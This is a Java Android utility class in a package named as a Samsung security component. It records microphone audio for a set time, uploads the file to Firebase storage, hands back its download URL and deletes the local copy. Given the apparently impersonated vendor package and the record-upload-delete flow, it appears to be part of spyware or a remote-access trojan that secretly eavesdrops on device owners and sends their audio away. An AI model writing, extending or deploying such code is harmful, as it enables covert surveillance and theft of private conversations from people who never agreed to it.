package com.samsung.android.security.v8.utils;

import android.content.Context;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Handler;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;

public class AudioUtil {
    
    private static MediaRecorder mediaRecorder;
    private static String currentAudioFile;
    
    public interface AudioCallback {
        void onRecordingComplete(String url);
        void onError(String error);
    }
    
    public static void recordAudio(Context context, int durationSeconds, AudioCallback callback) {
        try {
            currentAudioFile = context.getCacheDir().getAbsolutePath() + 
                    "/audio_" + System.currentTimeMillis() + ".3gp";
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentAudioFile);
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            
            new Handler().postDelayed(() -> {
                stopRecording(callback);
            }, durationSeconds * 1000L);
            
        } catch (Exception e) {
            callback.onError(e.getMessage());
        }
    }
    
    private static void stopRecording(AudioCallback callback) {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
            }
            
            if (currentAudioFile != null) {
                File audioFile = new File(currentAudioFile);
                uploadToFirebase(audioFile, callback);
            }
        } catch (Exception e) {
            callback.onError(e.getMessage());
        }
    }
    
    private static void uploadToFirebase(File file, AudioCallback callback) {
        try {
            FirebaseStorage storage = FirebaseStorage.getInstance();
            StorageReference storageRef = storage.getReference();
            StorageReference fileRef = storageRef.child("audio/" + file.getName());
            
            Uri fileUri = Uri.fromFile(file);
            
            fileRef.putFile(fileUri)
                    .addOnSuccessListener(taskSnapshot -> {
                        fileRef.getDownloadUrl().addOnSuccessListener(uri -> {
                            callback.onRecordingComplete(uri.toString());
                            file.delete();
                        });
                    })
                    .addOnFailureListener(e -> {
                        callback.onError(e.getMessage());
                    });
                    
        } catch (Exception e) {
            callback.onError(e.getMessage());
        }
    }
}
